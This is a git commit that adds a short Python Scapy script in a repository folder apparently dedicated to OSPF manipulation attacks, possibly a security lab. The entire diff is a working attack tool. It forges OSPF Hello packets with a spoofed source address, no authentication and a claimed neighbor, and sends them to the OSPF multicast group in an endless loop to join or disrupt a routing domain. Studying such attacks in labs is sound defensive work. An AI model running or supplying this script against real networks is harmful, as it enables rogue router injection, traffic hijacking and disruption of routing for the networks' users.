ec8df1bfeee6cecc36d8624aeed8e344b502b273
Yassine <yassine06aarab1912@gmail.com>
2026-08-12 09:54:40 +0100

    Create OSPF Hello packet sender script
    Added a script to send OSPF Hello packets continuously.

--- attack-03-ospf-manipulation/tools/ospf_hello.py
+++ attack-03-ospf-manipulation/tools/ospf_hello.py
@@ -1,1 +1,11 @@
-
+#!/usr/bin/env python3
+from scapy.all import *
+from scapy.contrib.ospf import *
+import time
+ospf_hello = (Ether(dst="01:00:5e:00:00:05") / IP(dst="224.0.0.5", ttl=1) / 
+              OSPF_Hdr(area="0.0.0.0", authtype=0, src="192.168.10.3") / 
+              OSPF_Hello(mask="255.255.255.0", hellointerval=10, deadinterval=40, 
+                         options="E", neighbors=["192.168.30.1"]))
+while True:
+    sendp(ospf_hello, iface="eth0")
+    time.sleep(10)
